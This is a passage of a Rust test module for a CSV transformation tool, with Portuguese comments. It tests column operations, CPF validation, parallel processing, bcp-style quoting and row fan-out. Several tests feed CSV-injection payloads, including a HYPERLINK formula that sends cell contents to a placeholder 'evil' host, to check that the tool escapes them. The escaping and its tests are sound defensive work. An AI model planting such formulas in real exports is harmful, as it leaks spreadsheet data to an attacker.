        assert_eq!(output, b"ALICE;30\nBOB;25\n");
    }

    #[test]
    fn process_records_in_memory_skips_header() {
        let input: &[u8] = b"name;age\nalice;30\n";
        let mut output: Vec<u8> = Vec::new();
        let columns =
            parse_columns(r#"[{"in":0,"out":0,"ops":[]},{"in":1,"out":1,"ops":[]}]"#).unwrap();

        let (i, o, inv) = process_records(input, &mut output, b';', b';', true, &columns, true, csv::QuoteStyle::Necessary).unwrap();
        assert_eq!((i, o, inv), (1, 1, 0));
        assert_eq!(output, b"alice;30\n");
    }

    #[test]
    fn process_records_in_memory_filters_invalid() {
        let input: &[u8] = b"11111111111\n12345678909\n";
        let mut output: Vec<u8> = Vec::new();
        let columns =
            parse_columns(r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"}]"#).unwrap();

        let (i, o, inv) = process_records(input, &mut output, b';', b';', false, &columns, true, csv::QuoteStyle::Necessary).unwrap();
        assert_eq!((i, o, inv), (2, 1, 1));
        assert_eq!(output, b"12345678909\n");
    }

    #[test]
    fn process_records_in_memory_handles_quoted_fields() {
        let input: &[u8] = b"1;\"Silva; Junior\";42\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[{"in":0,"out":0,"ops":[]},{"in":1,"out":1,"ops":["uppercase"]},{"in":2,"out":2,"ops":[]}]"#,
        )
        .unwrap();

        let (i, o, _) = process_records(input, &mut output, b';', b';', false, &columns, true, csv::QuoteStyle::Necessary).unwrap();
        assert_eq!((i, o), (1, 1));
        // Campo com delimitador embutido é re-quotado pelo csv::Writer.
        assert_eq!(output, b"1;\"SILVA; JUNIOR\";42\n");
    }

    // ===========================================================
    // Formula escape (CSV injection mitigation)
    // ===========================================================

    #[test]
    fn needs_formula_escape_triggers_on_dangerous_prefixes() {
        assert!(needs_formula_escape("=1+1"));
        assert!(needs_formula_escape("+CMD"));
        assert!(needs_formula_escape("-2"));
        assert!(needs_formula_escape("@SUM(1)"));
        assert!(needs_formula_escape("\ttabbed"));
        assert!(needs_formula_escape("\rcarriage"));
    }

    #[test]
    fn needs_formula_escape_ignores_safe_values() {
        assert!(!needs_formula_escape(""));
        assert!(!needs_formula_escape("abc"));
        assert!(!needs_formula_escape("123"));
        assert!(!needs_formula_escape(" =leading space"));
        assert!(!needs_formula_escape("a=b"));
        assert!(!needs_formula_escape("ALICE"));
    }

    #[test]
    fn process_records_escapes_formula_field_by_default() {
        // Payload clássico de CSV injection. Com escape_formulas=true, o '='
        // inicial recebe prefixo de aspa simples.
        let input: &[u8] = b"1;=HYPERLINK(\"http://evil/?x=\"&A1,\"clique\")\n";
        let mut output: Vec<u8> = Vec::new();
        let columns =
            parse_columns(r#"[{"in":0,"out":0,"ops":[]},{"in":1,"out":1,"ops":[]}]"#).unwrap();

        let (i, o, _) =
            process_records(input, &mut output, b';', b';', false, &columns, true, csv::QuoteStyle::Necessary).unwrap();
        assert_eq!((i, o), (1, 1));

        let out_str = std::str::from_utf8(&output).unwrap();
        // O campo perigoso começa com `'=` (prefixo de neutralização).
        // O csv::Writer quota o campo porque ele contém `"`.
        assert!(
            out_str.contains("'=HYPERLINK"),
            "expected escaped formula, got: {}",
            out_str
        );
    }

    #[test]
    fn process_records_escapes_all_dangerous_prefixes() {
        // Cada linha cobre um trigger diferente: =, +, -, @
        let input: &[u8] = b"=1+1\n+CMD\n-2\n@SUM(1)\nsafe\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(r#"[{"in":0,"out":0,"ops":[]}]"#).unwrap();

        let (_, _, _) =
            process_records(input, &mut output, b';', b';', false, &columns, true, csv::QuoteStyle::Necessary).unwrap();

        let out_str = std::str::from_utf8(&output).unwrap();
        // csv::Writer re-quota campos que começam com `'` porque não são
        // caracteres especiais, mas pelos nossos padrões ficam sem quoting.
        assert!(out_str.contains("'=1+1"));
        assert!(out_str.contains("'+CMD"));
        assert!(out_str.contains("'-2"));
        assert!(out_str.contains("'@SUM(1)"));
        assert!(out_str.contains("safe"));
        // "safe" não deve ser prefixado
        assert!(!out_str.contains("'safe"));
    }

    #[test]
    fn process_records_does_not_escape_when_flag_off() {
        // Opt-out explícito para pipelines internos onde a saída nunca vai
        // para planilha.
        let input: &[u8] = b"=1+1\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(r#"[{"in":0,"out":0,"ops":[]}]"#).unwrap();

        process_records(input, &mut output, b';', b';', false, &columns, false, csv::QuoteStyle::Necessary).unwrap();

        let out_str = std::str::from_utf8(&output).unwrap();
        // O campo começa com '=' puro, sem prefixo.
        assert_eq!(out_str, "=1+1\n");
    }

    #[test]
    fn process_records_escapes_field_built_by_ops_chain() {
        // Caso sutil: o campo de entrada é seguro, mas ops podem produzir
        // uma saída perigosa. Ex.: strip_ddi removendo prefixo deixa '=' na
        // frente. O escape deve olhar o resultado final, não o input.
        let input: &[u8] = b"XX=malicious\n";
        let mut output: Vec<u8> = Vec::new();
        let columns =
            parse_columns(r#"[{"in":0,"out":0,"ops":["strip_ddi:XX"]}]"#).unwrap();

        process_records(input, &mut output, b';', b';', false, &columns, true, csv::QuoteStyle::Necessary).unwrap();

        let out_str = std::str::from_utf8(&output).unwrap();
        // Após strip_ddi, o campo vira "=malicious" — e deve ser escapado.
        assert!(
            out_str.contains("'=malicious"),
            "expected escape after ops chain, got: {}",
            out_str
        );
    }

    #[test]
    fn process_records_escape_does_not_break_validation() {
        // Validation acontece ANTES do escape — o validator vê o valor real.
        // Um CPF válido continua válido mesmo que depois do escape seu primeiro
        // char vire uma aspa simples.
        let input: &[u8] = b"12345678909\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"}]"#,
        )
        .unwrap();

        let (i, o, inv) =
            process_records(input, &mut output, b';', b';', false, &columns, true, csv::QuoteStyle::Necessary).unwrap();
        // Campo começa com '1' (dígito) — não é trigger, passa sem prefixo.
        assert_eq!((i, o, inv), (1, 1, 0));
        assert_eq!(output, b"12345678909\n");
    }

    // ===========================================================
    // quote_style (bcp-friendly output)
    // ===========================================================

    #[test]
    fn quote_style_never_does_not_quote_embedded_delimiter() {
        // Com quote_style=Never, campo com delimiter embutido vai para a
        // saída SEM aspas — output fica "corrompido" do ponto de vista RFC
        // 4180 mas é EXATAMENTE o que bcp espera (e quebra se quiser
        // parsear o próprio output). Responsabilidade do layout não deixar
        // delimitador passar — aqui exercitamos o writer, não o layout.
        let input: &[u8] = b"1;value;extra\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[{"in":0,"out":0,"ops":[]},{"in":1,"out":1,"ops":[]},{"in":2,"out":2,"ops":[]}]"#,
        )
        .unwrap();

        process_records(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            false,
            csv::QuoteStyle::Never,
        )
        .unwrap();
        // Três campos ASCII puros, sem aspas ao redor
        assert_eq!(output, b"1;value;extra\n");
    }

    #[test]
    fn quote_style_necessary_wraps_embedded_delimiter() {
        // Default: RFC 4180 — campo com delimiter embutido é quotado
        let input: &[u8] = b"1;\"has;delim\";3\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[{"in":0,"out":0,"ops":[]},{"in":1,"out":1,"ops":[]},{"in":2,"out":2,"ops":[]}]"#,
        )
        .unwrap();

        process_records(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            false,
            csv::QuoteStyle::Necessary,
        )
        .unwrap();
        assert_eq!(output, b"1;\"has;delim\";3\n");
    }

    #[test]
    fn parse_quote_style_known_values() {
        assert!(matches!(parse_quote_style("necessary").unwrap(), csv::QuoteStyle::Necessary));
        assert!(matches!(parse_quote_style("always").unwrap(), csv::QuoteStyle::Always));
        assert!(matches!(parse_quote_style("never").unwrap(), csv::QuoteStyle::Never));
    }

    #[test]
    fn parse_quote_style_rejects_unknown() {
        let err = parse_quote_style("rfc4180").unwrap_err();
        assert!(err.contains("unknown quote_style"));
        assert!(err.contains("rfc4180"));
    }

    #[test]
    fn process_file_impl_rejects_invalid_quote_style() {
        let dir = unique_temp_dir("bad_qs");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "a\n");

        let fp = FileProcessor;
        let err = fp
            .process_file_impl(
                path_str(&input),
                path_str(&output),
                ";",
                ";",
                false,
                r#"[{"in":0,"out":0,"ops":[]}]"#,
                true,
                "banana",
            )
            .unwrap_err();
        assert!(err.contains("unknown quote_style"));
    }

    // ===========================================================
    // Integração: document obrigatório + bcp-mode
    // ===========================================================

    #[test]
    fn document_required_with_bcp_mode_drops_invalid_rows() {
        // Cenário completo: pipeline em modo bcp (no quote, no formula
        // escape), com document_canonical + not_blank marcando a linha
        // como obrigatória. Linhas com doc inválido caem.
        let dir = unique_temp_dir("pipeline_doc_bcp");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");

        // 4 linhas: 2 CPFs válidos (com formatação), 1 CNPJ válido, 1 lixo
        write_file(
            &input,
            "123.456.789-09;Alice\n\
             11222333000181;Bellinati\n\
             11111111111;Bob\n\
             12345678909;Carol\n",
        );

        let layout = r#"[
            {"in":0,"out":0,"ops":["document_canonical"],"validate":"not_blank"},
            {"in":1,"out":1,"ops":["trim","uppercase"]}
        ]"#;

        let fp = FileProcessor;
        let res = fp
            .process_parallel_impl(
                path_str(&input),
                path_str(&output),
                2,
                ";",
                ";",
                false,
                layout,
                false,     // escape_formulas OFF para bcp
                "never",   // quote_style OFF para bcp
            )
            .unwrap();

        assert_eq!(res, vec![4, 3, 1]); // 3 válidos, 1 inválido
        let out = read_file(&output);

        // Saída normalizada, sem aspas, sem prefixo de escape
        assert!(out.contains("12345678909;ALICE"));
        assert!(out.contains("11222333000181;BELLINATI"));
        assert!(out.contains("12345678909;CAROL"));
        // Bob (CPF inválido 11111111111) caiu
        assert!(!out.contains("BOB"));
    }

    #[test]
    fn process_records_propagates_write_error() {
        // Writer que falha imediatamente para exercitar o caminho de erro.
        struct FailingWriter;
        impl std::io::Write for FailingWriter {
            fn write(&mut self, _: &[u8]) -> std::io::Result<usize> {
                Err(std::io::Error::new(std::io::ErrorKind::Other, "nope"))
            }
            fn flush(&mut self) -> std::io::Result<()> {
                Err(std::io::Error::new(std::io::ErrorKind::Other, "nope"))
            }
        }

        let input: &[u8] = b"a\n";
        let columns = parse_columns(r#"[{"in":0,"out":0,"ops":[]}]"#).unwrap();
        let err =
            process_records(input, FailingWriter, b';', b';', false, &columns, true, csv::QuoteStyle::Necessary).unwrap_err();
        assert!(err.to_lowercase().contains("nope") || err.to_lowercase().contains("io"));
    }

    // ===========================================================
    // process_file_impl
    // ===========================================================

    #[test]
    fn process_file_applies_operations() {
        let dir = unique_temp_dir("proc_file_ops");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "  hello ;world\n foo ;bar\n");

        let fp = FileProcessor;
        let res = fp
            .process_file_impl(
                path_str(&input),
                path_str(&output),
                ";",
                ";",
                false,
                r#"[
                    {"in":0,"out":0,"ops":["trim","uppercase"]},
                    {"in":1,"out":1,"ops":["trim"]}
                ]"#,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(res, vec![2, 2, 0]);
        let out = read_file(&output);
        assert!(out.contains("HELLO;world"));
        assert!(out.contains("FOO;bar"));
    }

    #[test]
    fn process_file_skips_header_when_flag_set() {
        let dir = unique_temp_dir("proc_file_header");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "name;age\nalice;30\nbob;25\n");

        let fp = FileProcessor;
        let res = fp
            .process_file_impl(
                path_str(&input),
                path_str(&output),
                ";",
                ";",
                true,
                r#"[{"in":0,"out":0,"ops":[]}]"#,
                true,
                "necessary",
            )
            .unwrap();
        assert_eq!(res[0], 2); // input_count exclui header
    }

    #[test]
    fn process_file_filters_invalid_rows_via_validator() {
        let dir = unique_temp_dir("proc_file_validate");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "11111111111\n12345678909\n");

        let fp = FileProcessor;
        let res = fp
            .process_file_impl(
                path_str(&input),
                path_str(&output),
                ";",
                ";",
                false,
                r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"}]"#,
                true,
                "necessary",
            )
            .unwrap();
        assert_eq!(res, vec![2, 1, 1]);
        let out = read_file(&output);
        assert!(out.contains("12345678909"));
        assert!(!out.contains("11111111111"));
    }

    #[test]
    fn process_file_handles_quoted_fields_with_embedded_delimiter() {
        let dir = unique_temp_dir("proc_file_quoted");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "1;\"Silva; Júnior\";42\n2;Souza;30\n");

        let fp = FileProcessor;
        let res = fp
            .process_file_impl(
                path_str(&input),
                path_str(&output),
                ";",
                ";",
                false,
                r#"[
                    {"in":0,"out":0,"ops":[]},
                    {"in":1,"out":1,"ops":["uppercase"]},
                    {"in":2,"out":2,"ops":[]}
                ]"#,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(res, vec![2, 2, 0]);
        let out = read_file(&output);
        assert!(out.contains("\"SILVA; JÚNIOR\""));
        assert!(out.contains("SOUZA"));
    }

    #[test]
    fn process_file_handles_quoted_field_with_embedded_quote() {
        let dir = unique_temp_dir("proc_file_quote_in_quote");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "1;\"he said \"\"hi\"\"\"\n");

        let fp = FileProcessor;
        let res = fp
            .process_file_impl(
                path_str(&input),
                path_str(&output),
                ";",
                ";",
                false,
                r#"[{"in":1,"out":0,"ops":[]}]"#,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(res[0], 1);
        let out = read_file(&output);
        assert!(out.contains("he said \"\"hi\"\""));
    }

    #[test]
    fn process_file_drops_empty_lines_current_behavior() {
        let dir = unique_temp_dir("proc_file_blank");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "a\n\nb\n");

        let fp = FileProcessor;
        let res = fp
            .process_file_impl(
                path_str(&input),
                path_str(&output),
                ";",
                ";",
                false,
                r#"[{"in":0,"out":0,"ops":[]}]"#,
                true,
                "necessary",
            )
            .unwrap();
        assert_eq!(res[0], 2); // linha em branco fora do input_count
    }

    // ===========================================================
    // process_chunks_impl
    // ===========================================================

    #[test]
    fn process_chunks_applies_ops_and_validates() {
        let dir = unique_temp_dir("proc_chunks_validate");
        write_file(&dir.join("input_0.csv"), "12345678909\n11111111111\n");
        write_file(&dir.join("input_1.csv"), "12345678909\n00000000000\n");

        let fp = FileProcessor;
        let res = fp
            .process_chunks_impl(
                path_str(&dir),
                2,
                ";",
                ";",
                false,
                r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"}]"#,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(res, vec![4, 2, 2]);
    }

    #[test]
    fn process_chunks_writes_output_per_chunk() {
        let dir = unique_temp_dir("proc_chunks_out");
        write_file(&dir.join("input_0.csv"), "alice;30\n");
        write_file(&dir.join("input_1.csv"), "bob;25\n");

        let fp = FileProcessor;
        fp.process_chunks_impl(
            path_str(&dir),
            2,
            ";",
            ",",
            false,
            r#"[{"in":0,"out":0,"ops":["uppercase"]},{"in":1,"out":1,"ops":[]}]"#,
            true,
            "necessary",
        )
        .unwrap();

        assert_eq!(read_file(&dir.join("output_0.csv")), "ALICE,30\n");
        assert_eq!(read_file(&dir.join("output_1.csv")), "BOB,25\n");
    }

    #[test]
    fn process_chunks_handles_missing_chunk_gracefully() {
        let dir = unique_temp_dir("proc_chunks_missing");
        write_file(&dir.join("input_0.csv"), "a\n");
        // input_1.csv ausente

        let fp = FileProcessor;
        let res = fp
            .process_chunks_impl(
                path_str(&dir),
                2,
                ";",
                ";",
                false,
                r#"[{"in":0,"out":0,"ops":[]}]"#,
                true,
                "necessary",
            )
            .unwrap();
        assert_eq!(res, vec![1, 1, 0]);
    }

    // ===========================================================
    // merge_files_impl
    // ===========================================================

    #[test]
    fn merge_files_concatenates_chunks_in_order() {
        let dir = unique_temp_dir("merge_ordered");
        write_file(&dir.join("output_0.csv"), "line1\nline2\n");
        write_file(&dir.join("output_1.csv"), "line3\n");
        write_file(&dir.join("output_2.csv"), "line4\nline5\n");

        let final_path = dir.join("final.csv");
        let fp = FileProcessor;
        let total = fp
            .merge_files_impl(path_str(&dir), path_str(&final_path), 3)
            .unwrap();

        assert_eq!(total, 5);
        assert_eq!(
            read_file(&final_path),
            "line1\nline2\nline3\nline4\nline5\n"
        );
    }

    #[test]
    fn merge_files_skips_missing_chunks() {
        let dir = unique_temp_dir("merge_missing");
        write_file(&dir.join("output_0.csv"), "a\n");
        // output_1.csv ausente
        write_file(&dir.join("output_2.csv"), "c\n");

        let final_path = dir.join("final.csv");
        let fp = FileProcessor;
        let total = fp
            .merge_files_impl(path_str(&dir), path_str(&final_path), 3)
            .unwrap();
        assert_eq!(total, 2);
        assert_eq!(read_file(&final_path), "a\nc\n");
    }

    // ===========================================================
    // process_parallel_impl (single-call, sem temp files)
    // ===========================================================

    #[test]
    fn process_parallel_basic_single_chunk() {
        // Com chunks=1 deve se comportar como o pipeline single-threaded.
        let dir = unique_temp_dir("pp_single");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "alice;30\nbob;25\n");

        let fp = FileProcessor;
        let res = fp
            .process_parallel_impl(
                path_str(&input),
                path_str(&output),
                1,
                ";",
                ";",
                false,
                r#"[{"in":0,"out":0,"ops":["uppercase"]},{"in":1,"out":1,"ops":[]}]"#,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(res, vec![2, 2, 0]);
        assert_eq!(read_file(&output), "ALICE;30\nBOB;25\n");
    }

    #[test]
    fn process_parallel_preserves_line_order() {
        // Buffers são escritos em ordem de chunk (0, 1, 2, ...) então a
        // ordem das linhas no output deve bater com a do input.
        let dir = unique_temp_dir("pp_order");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        let content: String = (0..100).map(|i| format!("row_{:03};{}\n", i, i * 7)).collect();
        write_file(&input, &content);

        let fp = FileProcessor;
        let res = fp
            .process_parallel_impl(
                path_str(&input),
                path_str(&output),
                4,
                ";",
                ";",
                false,
                r#"[{"in":0,"out":0,"ops":[]},{"in":1,"out":1,"ops":[]}]"#,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(res, vec![100, 100, 0]);
        let out = read_file(&output);
        // Primeira e última linha devem estar no lugar esperado
        assert!(out.starts_with("row_000;0\n"));
        assert!(out.ends_with("row_099;693\n"));
        // Ordem global preservada
        let lines: Vec<&str> = out.lines().collect();
        for (i, line) in lines.iter().enumerate() {
            assert_eq!(*line, format!("row_{:03};{}", i, i * 7));
        }
    }

    #[test]
    fn process_parallel_filters_invalid_rows() {
        let dir = unique_temp_dir("pp_validate");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(
            &input,
            "12345678909;Alice\n11111111111;Bob\n12345678909;Carol\n",
        );

        let fp = FileProcessor;
        let res = fp
            .process_parallel_impl(
                path_str(&input),
                path_str(&output),
                2,
                ";",
                ";",
                false,
                r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"},{"in":1,"out":1,"ops":["uppercase"]}]"#,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(res, vec![3, 2, 1]);
        let out = read_file(&output);
        assert!(out.contains("ALICE"));
        assert!(out.contains("CAROL"));
        assert!(!out.contains("BOB"));
    }

    #[test]
    fn process_parallel_skip_header_only_affects_first_chunk() {
        let dir = unique_temp_dir("pp_header");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        // Header + 3 linhas de dados
        write_file(
            &input,
            "name;age\nalice;30\nbob;25\ncarol;40\n",
        );

        let fp = FileProcessor;
        let res = fp
            .process_parallel_impl(
                path_str(&input),
                path_str(&output),
                2,
                ";",
                ";",
                true,
                r#"[{"in":0,"out":0,"ops":[]},{"in":1,"out":1,"ops":[]}]"#,
                true,
                "necessary",
            )
            .unwrap();

        // 3 linhas de dados no input (header skipped uma única vez)
        assert_eq!(res[0], 3);
        assert_eq!(res[1], 3);

        let out = read_file(&output);
        assert!(!out.contains("name;age"));
        assert!(out.contains("alice;30"));
        assert!(out.contains("bob;25"));
        assert!(out.contains("carol;40"));
    }

    #[test]
    fn process_parallel_escapes_formulas_by_default() {
        let dir = unique_temp_dir("pp_escape");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "1;=HYPERLINK(\"http://evil\",\"go\")\n");

        let fp = FileProcessor;
        let res = fp
            .process_parallel_impl(
                path_str(&input),
                path_str(&output),
                2,
                ";",
                ";",
                false,
                r#"[{"in":0,"out":0,"ops":[]},{"in":1,"out":1,"ops":[]}]"#,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(res, vec![1, 1, 0]);
        let out = read_file(&output);
        assert!(out.contains("'=HYPERLINK"));
    }

    #[test]
    fn process_parallel_opt_out_of_escape() {
        let dir = unique_temp_dir("pp_no_escape");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "=1+1\n");

        let fp = FileProcessor;
        fp.process_parallel_impl(
            path_str(&input),
            path_str(&output),
            1,
            ";",
            ";",
            false,
            r#"[{"in":0,"out":0,"ops":[]}]"#,
            false,
            "necessary",
        )
        .unwrap();

        assert_eq!(read_file(&output), "=1+1\n");
    }

    #[test]
    fn process_parallel_handles_chunks_larger_than_records() {
        // Se chunks=8 mas só tem 3 linhas, alguns ranges serão vazios.
        // Deve tratar graciosamente.
        let dir = unique_temp_dir("pp_overpartition");
        let input = dir.join("in.csv");
        let output = dir.join("out.csv");
        write_file(&input, "a\nb\nc\n");

        let fp = FileProcessor;
        let res = fp
            .process_parallel_impl(
                path_str(&input),
                path_str(&output),
                8,
                ";",
                ";",
                false,
                r#"[{"in":0,"out":0,"ops":[]}]"#,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(res[0], 3);
        assert_eq!(read_file(&output), "a\nb\nc\n");
    }

    #[test]
    fn process_parallel_matches_three_step_pipeline_output() {
        // Paridade: processar via process_parallel_impl deve produzir o MESMO
        // output que o pipeline antigo (split + chunks + merge). Mesmos input
        // counts, mesmos output counts, mesmo conteúdo final.
        let dir_old = unique_temp_dir("parity_old");
        let dir_new = unique_temp_dir("parity_new");
        let input_content =
            "12345678909;Alice\n11111111111;Bob\n12345678909;Carol\n12345678909;Dave\n";
        let input_old = dir_old.join("in.csv");
        let input_new = dir_new.join("in.csv");
        let output_old = dir_old.join("final.csv");
        let output_new = dir_new.join("out.csv");
        write_file(&input_old, input_content);
        write_file(&input_new, input_content);

        let layout =
            r#"[{"in":0,"out":0,"ops":[],"validate":"cpf"},{"in":1,"out":1,"ops":["uppercase"]}]"#;

        let fp = FileProcessor;

        // Pipeline antigo (3 etapas)
        fp.split_file_impl(path_str(&input_old), path_str(&dir_old), 3)
            .unwrap();
        let old_totals = fp
            .process_chunks_impl(
                path_str(&dir_old),
                3,
                ";",
                ";",
                false,
                layout,
                true,
                "necessary",
            )
            .unwrap();
        fp.merge_files_impl(path_str(&dir_old), path_str(&output_old), 3)
            .unwrap();

        // Pipeline novo (1 chamada)
        let new_totals = fp
            .process_parallel_impl(
                path_str(&input_new),
                path_str(&output_new),
                3,
                ";",
                ";",
                false,
                layout,
                true,
                "necessary",
            )
            .unwrap();

        assert_eq!(old_totals, new_totals);
        assert_eq!(read_file(&output_old), read_file(&output_new));
    }

    // ===========================================================
    // process_records_denormalize (fan-out in-memory)
    // ===========================================================

    #[test]
    fn denormalize_basic_fan_out() {
        // 1 estática (doc) + grupos de 2 (ddd, phone). 3 grupos por linha.
        let input: &[u8] = b"33176825404;11;987148038;11;987432606;11;987694281\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":["digits_only"]},
                {"in":1,"out":1,"ops":["digits_only"]},
                {"in":2,"out":2,"ops":["digits_only"]}
            ]"#,
        )
        .unwrap();

        let (i, o, inv) = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1, // static_cols
            2, // group_size
            false,
            csv::QuoteStyle::Necessary,
            false,
        )
        .unwrap();

        assert_eq!((i, o, inv), (1, 3, 0));
        let out_str = std::str::from_utf8(&output).unwrap();
        assert_eq!(
            out_str,
            "33176825404;11;987148038\n\
             33176825404;11;987432606\n\
             33176825404;11;987694281\n"
        );
    }

    #[test]
    fn denormalize_multiple_input_rows() {
        // 2 linhas de entrada, cada uma com 2 grupos → 4 linhas de saída
        let input: &[u8] = b"aaa;11;1111;22;2222\n\
                            bbb;33;3333;44;4444\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":[]},
                {"in":1,"out":1,"ops":[]},
                {"in":2,"out":2,"ops":[]}
            ]"#,
        )
        .unwrap();

        let (i, o, _) = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Necessary,
            false,
        )
        .unwrap();

        assert_eq!((i, o), (2, 4));
        let out_str = std::str::from_utf8(&output).unwrap();
        assert_eq!(
            out_str,
            "aaa;11;1111\n\
             aaa;22;2222\n\
             bbb;33;3333\n\
             bbb;44;4444\n"
        );
    }

    #[test]
    fn denormalize_skips_incomplete_trailing_group() {
        // doc + 1 grupo completo + 1 coluna "sobrando" (ímpar no fim)
        let input: &[u8] = b"doc;11;1111;22\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":[]},
                {"in":1,"out":1,"ops":[]},
                {"in":2,"out":2,"ops":[]}
            ]"#,
        )
        .unwrap();

        let (i, o, _) = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Necessary,
            false,
        )
        .unwrap();

        // Só o grupo completo é emitido; o "22" solto é ignorado.
        assert_eq!((i, o), (1, 1));
        assert_eq!(std::str::from_utf8(&output).unwrap(), "doc;11;1111\n");
    }

    #[test]
    fn denormalize_skips_rows_shorter_than_static_prefix() {
        // Linha com 0 colunas depois do prefixo → zero saídas para essa linha
        let input: &[u8] = b"doc\n\
                            doc;11;1111\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":[]},
                {"in":1,"out":1,"ops":[]},
                {"in":2,"out":2,"ops":[]}
            ]"#,
        )
        .unwrap();

        let (i, o, _) = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Necessary,
            false,
        )
        .unwrap();

        assert_eq!((i, o), (2, 1));
        assert_eq!(std::str::from_utf8(&output).unwrap(), "doc;11;1111\n");
    }

    #[test]
    fn denormalize_runs_validators_per_output_row() {
        // 1 input com 3 grupos; 1 grupo tem DDD inválido → essa saída cai,
        // as outras 2 passam.
        let input: &[u8] = b"33176825404;11;987148038;10;999999999;12;987432606\n";
        //                                 ^^ válido  ^^ inválido (10)  ^^ válido
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":["digits_only"],"validate":"document"},
                {"in":1,"out":1,"ops":["digits_only"],"validate":"area_code"},
                {"in":2,"out":2,"ops":["digits_only"],"validate":"phone"}
            ]"#,
        )
        .unwrap();

        let (i, o, inv) = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Necessary,
            false,
        )
        .unwrap();

        // 1 input → 3 tentativas → 2 válidas, 1 inválida
        assert_eq!((i, o, inv), (1, 2, 1));
        let out_str = std::str::from_utf8(&output).unwrap();
        assert!(out_str.contains("33176825404;11;987148038"));
        assert!(out_str.contains("33176825404;12;987432606"));
        assert!(!out_str.contains("999999999"));
    }

    #[test]
    fn denormalize_rejects_invalid_virtual_column_index() {
        // Layout declara in:3 mas virtual width é 1+2=3 (válidos: 0, 1, 2)
        let input: &[u8] = b"a;b;c\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[{"in":3,"out":0,"ops":[]}]"#,
        )
        .unwrap();

        let err = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            false,
            csv::QuoteStyle::Necessary,
            false,
        )
        .unwrap_err();
        assert!(err.contains("exceeds virtual row width"));
    }

    #[test]
    fn denormalize_rejects_zero_group_size() {
        let input: &[u8] = b"a;b\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(r#"[{"in":0,"out":0,"ops":[]}]"#).unwrap();

        let err = process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            0, // group_size inválido
            false,
            csv::QuoteStyle::Necessary,
            false,
        )
        .unwrap_err();
        assert!(err.contains("group_size"));
    }

    #[test]
    fn denormalize_respects_escape_formulas_per_output() {
        // Um grupo tem '=' no input → deve ser escapado nas saídas
        let input: &[u8] = b"doc;=CMD;safe\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":[]},
                {"in":1,"out":1,"ops":[]},
                {"in":2,"out":2,"ops":[]}
            ]"#,
        )
        .unwrap();

        process_records_denormalize(
            input,
            &mut output,
            b';',
            b';',
            false,
            &columns,
            1,
            2,
            true,
            csv::QuoteStyle::Necessary,
            false,
        )
        .unwrap();

        let out_str = std::str::from_utf8(&output).unwrap();
        assert!(out_str.contains("'=CMD"));
    }

    #[test]
    fn denormalize_bcp_mode_no_quoting_no_escape() {
        let input: &[u8] = b"doc;11;1111;22;2222\n";
        let mut output: Vec<u8> = Vec::new();
        let columns = parse_columns(
            r#"[
                {"in":0,"out":0,"ops":[]},
